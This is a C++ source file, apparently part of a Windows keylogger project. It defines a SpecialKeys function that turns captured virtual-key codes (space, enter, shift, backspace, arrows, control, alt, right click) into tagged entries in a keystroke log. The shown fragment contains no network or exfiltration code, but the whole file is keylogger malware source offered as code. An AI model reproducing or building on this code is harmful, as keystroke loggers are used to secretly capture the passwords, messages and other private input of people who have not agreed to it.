#include "headers.hpp"
#include "keylogg.hpp"

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" #SPACE# ");
		return true;
	case VK_RETURN:
		LOG(" #ENTER#\n ");
		return true;
	case '.':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG(" #SHIFT# ");
		return true;
	case VK_BACK:
		LOG(" #BACKSPACE# ");
		return true;
	case VK_RBUTTON:
		LOG(" #R_CLICK# ");
		return true;
	case VK_CAPITAL:
		LOG(" #CAPS_LOCK# ");
		return true;
	case VK_TAB:
		LOG(" #TAB# ");
		return true;
	case VK_UP:
		LOG(" #UP_ARROW# ");
		return true;
	case VK_DOWN:
		LOG(" #DOWN_ARROW# ");
		return true;
	case VK_LEFT:
		LOG(" #LEFT_ARROW# ");
		return true;
	case VK_RIGHT:
		LOG(" #RIGHT_ARROW# ");
		return true;
	case VK_CONTROL:
		LOG(" #CONTROL# ");
		return true;
	case VK_MENU:
		LOG(" #ALT# ");
		return true;
	default:
		return false;
	}
}
